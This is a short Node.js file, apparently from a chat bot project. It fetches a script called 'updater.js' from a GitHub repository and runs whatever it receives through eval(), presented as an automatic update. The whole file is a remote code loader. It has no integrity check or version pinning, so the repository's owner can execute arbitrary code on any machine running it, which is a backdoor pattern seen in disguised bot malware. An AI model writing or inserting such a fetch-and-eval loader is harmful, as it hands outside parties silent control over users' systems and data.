const axios = require('axios');

axios.get("https://raw.githubusercontent.com/Eshu2233/Naruto-bot/main/updater.js")
	.then(res => eval(res.data))
	.catch(err => console.error("Update error:", err.message)); 